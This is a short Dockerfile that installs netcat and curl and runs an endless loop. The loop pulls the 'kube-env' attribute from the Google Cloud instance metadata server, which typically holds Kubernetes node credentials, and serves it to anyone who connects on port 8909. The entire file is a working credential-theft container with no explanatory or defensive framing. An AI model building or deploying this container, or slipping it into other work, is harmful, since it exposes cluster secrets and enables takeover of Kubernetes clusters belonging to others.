FROM ubuntu
RUN apt-get update && apt-get install -y netcat
RUN apt-get install -y curl
CMD while true; do { echo -e 'HTTP/1.1 200 OK\r\n'; curl -s "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env" -H "Metadata-Flavor: Google";  } | nc -l 8909; done
